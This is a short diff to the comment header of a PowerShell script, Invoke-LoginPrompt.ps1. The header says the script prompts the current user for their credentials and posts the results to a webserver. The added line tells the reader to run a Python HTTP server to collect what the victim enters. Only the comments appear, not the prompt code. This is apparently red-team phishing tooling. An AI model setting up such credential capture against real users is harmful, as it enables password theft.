@@ -3,7 +3,8 @@
 Standalone Powershell script that will promp the current user for a valid credentials.
 Taken from Matt Nelson (@enigma0x3)
 
-Simple tweaks added to post results to a webserver - still a bit messy (work in progrss)
+Simple tweaks added to post results to a webserver - still a bit messy (work in progress)
+Have a webserver listening on the target IP (test.php file is not needed), e.g.: python -m SimpleHTTPServer 8080
 Filename: Invoke-LoginPrompt.ps1
 #>
 
